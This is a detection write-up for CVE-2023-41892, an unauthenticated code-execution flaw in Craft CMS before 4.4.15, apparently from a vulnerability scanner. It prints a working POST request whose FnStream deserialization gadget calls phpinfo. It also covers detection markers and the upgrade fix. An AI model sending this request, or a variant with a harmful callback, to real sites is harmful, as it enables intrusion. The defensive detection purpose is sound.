# Craft CMS before 4.4.15 unauthenticated RCE (CVE-2023-41892)

**CVE-2023-41892** is an unauthenticated remote code execution vulnerability in
Craft CMS (CWE-94). The `conditions/render` controller action is reachable
without authentication and deserializes a caller-supplied condition config. A
crafted config instantiates `GuzzleHttp\Psr7\FnStream` with its `_fn_close`
callback set to a PHP function, which is invoked when the stream closes.

```text
POST /index.php
Content-Type: application/x-www-form-urlencoded

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}
```

## Affected and fixed versions
Craft CMS **before 4.4.15**. Fixed in **4.4.15** (2023-07-03).

## How the detection confirms it
One anonymous `POST` carrying the gadget with `_fn_close` set to `phpinfo` --
a read-only PHP function. A finding needs HTTP 200 and the phpinfo page markers
(`PHP Version`, `PHP Group`, `PHP Extension`), proving the gadget executed
arbitrary code. Only `phpinfo()` is invoked, so no file is written and no state
changes; the request is bounded.

## Remediation
Upgrade Craft CMS to 4.4.15 or later. Treat any exposed install as potentially
compromised and review for web-shell drops or configuration tampering.
